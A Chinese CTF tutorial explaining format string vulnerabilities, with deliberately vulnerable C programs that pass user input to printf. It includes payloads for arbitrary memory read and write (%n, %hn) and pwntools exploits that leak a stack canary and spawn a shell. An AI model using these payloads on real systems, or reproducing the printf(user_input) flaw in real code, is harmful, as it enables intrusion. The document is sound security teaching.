> 原文链接: https://www.anquanke.com//post/id/85203 


# 【技术分享】跟我入坑PWN第二章


                                阅读量   
                                **187305**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

**[![](https://p4.ssl.qhimg.com/t01d763a49d29f3989c.png)](https://p4.ssl.qhimg.com/t01d763a49d29f3989c.png)**

**作者：[WeaponX](http://bobao.360.cn/member/contribute?uid=2803578480)**

**预估稿费：400RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿**



**传送门**

[**【技术分享】跟我入坑PWN第一章******](http://bobao.360.cn/learning/detail/3300.html)



**0x00 背景介绍**



格式化字符串漏洞，虽然在现在真实的环境下已经基本绝迹了。但是在CTF中还是有很多出题点的，本文将阐述格式化字符串漏洞的成因和利用场景与方法。

未注明的情况下，本文的测试环境为Ubuntu 14.04 desktop x86-64，使用到的程序为gdb、gdb-peda、gcc、python、pwntools、socat、rp++、readelf。所有的应用都可以在[《跟我入坑PWN第一章》](http://bobao.360.cn/learning/detail/3300.html)中找到。

<br>

**0x01 格式化字符串漏洞介绍**



首先，我们来看看什么是格式化字符串：

包含文本的格式参数的字符串，比如"What's your name %s?"。其中，"What's your name "是文本"%s"是格式参数。

下面，我们先看一个示例。



```
#include&lt;stdio.h&gt;
int main()
`{`
    char *nick_name = "WeaponX";
    printf("What's your name %s?n", nick_name); 
    printf("What's your name %s?n");
    return 0;
`}`
```

测试环境Windows XP 32bit、VC 6.0、Win32 Release，程序输出的结果如下：

```
What's your name WeaponX?
What's your name What's your name %s?
?
Press any key to continue
```

  为什么会这样呢？我们接着往下看。在[《跟我入坑PWN第一章》](http://bobao.360.cn/learning/detail/3300.html)中可以知道，在x86中函数的参数是放在栈中的，所以在第一个printf调用时，栈中的数据是这样的。

```
Stackframe
+------------------+
|   parameter1     |  &lt;- ESP  (pointer to "What's your name %sn?")
+------------------+
|   parameter2     |  &lt;- pointer to "WeaponX"
+------------------+
|       ...        |
+------------------+
```

所以，在调用printf的时候，会在%s的位置填入WeaponX，变成了"What's your name WeaponX?n"，也就是我们看到的第一行的输出。然而，在第二个printf的时候，我们只传了一个参数，栈中的数据是这样的。

```
Stackframe
+------------------+
|   parameter1     |  &lt;- ESP  (pointer to "What's your name %sn?")
+------------------+
|       data       |  &lt;- pointer to "What's your name %sn?"
+------------------+
|       data       |  &lt;- pointer to "WeaponX"
+------------------+
|       ...        |
+------------------+
```

printf期待下一个参数，而我们只传了一个参数，但是printf并不知道。会继续向高地址取四字节当成下一个参数。所以，第二个printf会把第一个printf的第一个参数也就是格式化字符串当成第二个参数来填充%s的位置，所以打印出来的结果就变成了"What's your name What's your name %sn?n?"，就是我们看到的内容。这就是格式化字符串漏洞的基本原理。

现在我们来看看，有什么常用的格式。



```
%d - 十进制 - 输出十进制整数
%s - 字符串 - 从内存中读取字符串
%x - 十六进制 - 输出十六进制数
%c - 字符 - 输出字符
%p - 指针 - 指针地址
%n - 到目前为止所写的字符数
```

这里需要注意一点，%s和%x的区别，

```
Stackframe
+------------------+
|   parameter1     |  &lt;- ESP  (pointer to "%s" or "%x")
+------------------+
|   0xdeadbeef     |
+------------------+
```

  当parameter1为%s的地址时，printf会将0xdeadbeef作为地址，取0xdeadbeef指向的字符串填入%s的位置并输出；当parameter1为%x的地址时，printf会直接将0xdeadbeef填入%x的位置，也就是直接输出0xdeadbeef。

<br>

**0x02 格式化字符串漏洞利用场景**



利用格式化字符串漏洞，我们可以完成任意地址读和任意地址写，下面我用一个例子来演示任意地址读和任意地址写。

```
#include&lt;stdio.h&gt;
int main()
`{`
    char str[0x20];
    scanf("%s", str);
    printf(str);
    return 0;
`}`
```

编译方式：

```
gcc -m32 -O0 vuln.c -o vuln
```

我们先输入payload "aaaa%08x%08x%08x%08x%08x%08x%08x"看执行结果：

```
➜ ./vuln 
aaaa%08x%08x%08x%08x%08x%08x%08x
aaaaff9d75ac0000000108048345ff9d82f20000002f0804a00061616161%
```

可以看到我们的payload中有%08x，其中08是等宽输出，意思就是如果输出的长度不够8个字符则用0补充到8个字符。<br>我们可以看到输出结果的最后四字节是0x61616161就是aaaa对应的16进制，是我们可以控制的内容。

下面我们来看看如何用格式化字符串漏洞完成任意地址读和任意地址写：

**1.任意地址读：**

根据0x01中的知识，我们只需要把最后一个%08x换成%s就可以读取0x61616161地址的数据，注意这个0x61616161是我们可以控制的内容，就是我们输入的前四个字节且这四个字节就是读取的地址。所以，可以通过替换这个payload的前四个字节完成任意地址读。

这个payload也可以简化为aaaa%7$s，这里的7$的意思就是取printf的第七个参数(0x61616161)，如果这里要用等宽输出的话payload就变成这样了aaaa%7$08x，结果会输出aaaa61616161。

**2.任意地址写：**

我们先了解一下%n的作用。%n是将输出的字符的个数写入到内存中。

根据上述知识，当payload为aaaa%7$n时，输出的字符数量为4，程序会将4写入0x61616161指向的内存中。如果我们需要写更大的数就得用等宽输出来实现了。假设，我们需要向0x61616161写入100，则payload就变成了aaaa%7$0100n。

任意地址写还有一个问题就是，如果我们要写一个很大的数，比如要将0x8048320写入0x61616161，这个16进制对应的十进制数为134513440，也就是说需要在输出134513440个字符。不用多想，程序肯定会崩溃。

如果遇到这种情况怎么办呢？我们可以通过%hn来两字节两字节写入。在上面的例子中，我们将0x8048320拆分为高两字节0x804和低两字节0x8320，将0x804也就是十进制2052写入0x61616161 – 0x61616162；将0x8320也就是十进制33568写入0x61616163 – 0x61616164。分两次写入就可以完成大数的写入了。

<br>

**0x03 相关利用场景示例**

**1.利用格式化字符串漏洞绕过canary**

首先我们了解一下canary的机制。canary类似于windows中GS机制，普通的函数栈如下：

```
Stackframe
+------------------+
|    parameter     |
+------------------+
|   local var1     |
+------------------+
|   local var2     |
+------------------+
|        ebp       |
+------------------+
|    return addr   |
+------------------+
```

如果，要利用缓冲区溢出覆盖返回地址比如要覆盖ebp。然而开启了canary后，函数栈就变成如下：

```
Stackframe
+------------------+
|    parameter     |
+------------------+
|   local var1     |
+------------------+
|   local var2     |
+------------------+
|      canary      | &lt;- Random
+------------------+
|        ebp       |
+------------------+
|    return addr   |
+------------------+
```

在ebp之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测canary是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖canary，这时程序会直接退出。绕过canary肯定需要知道canary的值，但是这个值是无法预测的，所以我们需要通过内存泄漏来泄漏出canary的值。下面我们给出一个示例程序：

```
#include&lt;stdio.h&gt;
void exploit()
`{`
    system("/bin/sh");
`}`
void func()
`{`
    char str[0x20];
    read(0, str, 0x50);
    printf(str);
    read(0, str, 0x50);
`}`
int main()
`{`
    func();
    return 0;
`}`
```

编译方式：

```
gcc -m32 -O0 vuln.c -o vuln
```

然后，我们使用gdb中的checksec看一下程序开启的保护：

```
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

此时，我们需要调试程序，让程序断在printf。查找canary距离printf第一个参数有多远，函数断在printf后栈中数据如下：

```
[-------------------------------------code-------------------------------------]
0x80485a8 &lt;func+39&gt;:    call   0x8048410 &lt;read@plt&gt;
0x80485ad &lt;func+44&gt;:    lea    eax,[ebp-0x2c]
0x80485b0 &lt;func+47&gt;:    mov    DWORD PTR [esp],eax
=&gt; 0x80485b3 &lt;func+50&gt;:    call   0x8048420 &lt;printf@plt&gt;
0x80485b8 &lt;func+55&gt;:    mov    DWORD PTR [esp+0x8],0x50
0x80485c0 &lt;func+63&gt;:    lea    eax,[ebp-0x2c]
0x80485c3 &lt;func+66&gt;:    mov    DWORD PTR [esp+0x4],eax
0x80485c7 &lt;func+70&gt;:    mov    DWORD PTR [esp],0x0
Guessed arguments:
arg[0]: 0xffffcf6c ("aaaan")
[------------------------------------stack-------------------------------------]
0000| 0xffffcf50 --&gt; 0xffffcf6c ("aaaan")
0004| 0xffffcf54 --&gt; 0xffffcf6c ("aaaan")
0008| 0xffffcf58 --&gt; 0x20 (' ')
0012| 0xffffcf5c --&gt; 0xf7eac716 (test   eax,eax)
0016| 0xffffcf60 --&gt; 0xffffffff 
0020| 0xffffcf64 --&gt; 0xf7e24b34 --&gt; 0x2910 
0024| 0xffffcf68 --&gt; 0xf7e24c34 --&gt; 0x2aad 
0028| 0xffffcf6c ("aaaan")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080485b3 in func ()
gdb-peda$ x/20wx 0xffffcf50
0xffffcf50:    0xffffcf6c    0xffffcf6c    0x00000020    0xf7eac716
0xffffcf60:    0xffffffff    0xf7e24b34    0xf7e24c34    0x61616161
0xffffcf70:    0x0000000a    0x00000000    0xffffcfb8    0xf7e7f0df
0xffffcf80:    0xf7fbf960    0x00000000    0x00002000    0xe920f900
0xffffcf90:    0xf7fbfc20    0xf7ffd938    0xffffcfb8    0x08048633
```

根据canary的特点，我们判断0xe920f900为canary，地址是0xffffcf8c。距离第一个参数有60字节，也就是15个参数的长度，所以要读canary我们的payload为%15x。经过分析，我们的exploit如下，先通过格式化字符串漏洞泄漏canary，再完成利用：

```
from pwn import *
elf = ELF("./vuln")
io = process("./vuln")
shell_addr = elf.symbols["exploit"]
payload = "%15$08x"
io.sendline(payload)
ret = io.recv()
canary = ret[:8]
log.success("canary =&gt; 0x`{``}`".format(canary))
payload = "a" * 4 * 8
payload += (canary.decode("hex"))[::-1] # 小端模式反转
payload += "a" * 4 * 3
payload += p32(shell_addr)
io.send(payload)
io.interactive()
```

**2.利用格式化字符串漏洞完成内存写**

我们给出一个示例程序：

```
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
#include&lt;stdlib.h&gt;
void exploit()
`{`
    system("/bin/sh");
`}`
int func()
`{`
    int *flag;
    char *cmp = "y";
    char name[20] = `{`0`}`;
    flag = (char *)malloc(4);
    memset(flag, 0, 4);
    memcpy(flag, "n", 1);
    scanf("%s", name);
    printf(name);
    if(!strcmp(flag, cmp))
    `{`
        exploit();
    `}`
    return 1;
`}`
int main()
`{`
    func();
    return 0;
`}`
```

可以看出，当flag的内容为y时，才能执行system("/bin/sh")，然而，flag的值总为n。这时候就需要用格式化字符串漏洞来写内存了。因为y的ascii码对应的10进制数为121，所以要打印121个字符，最终我们的exploit如下：

```
from pwn import *
io = process("./vuln")
elf = ELF("./vuln")
shell_addr = elf.symbols["exploit"]  
payload = "%0121x%5$n"   
io.sendline(payload)   
io.interactive()
```

最后，如果是64bit的程序，需要泄漏canary的情况下。因为x86_64的canary为8字节，所以需要两次泄漏（误），其实使用%lx就可以啦。

<br>

**0x04 参考文献**

[http://www.secbox.cn/hacker/7482.html](http://www.secbox.cn/hacker/7482.html)

[http://www.freebuf.com/articles/network/62473.html](http://www.freebuf.com/articles/network/62473.html)



**传送门**

[**【技术分享】跟我入坑PWN第一章******](http://bobao.360.cn/learning/detail/3300.html)


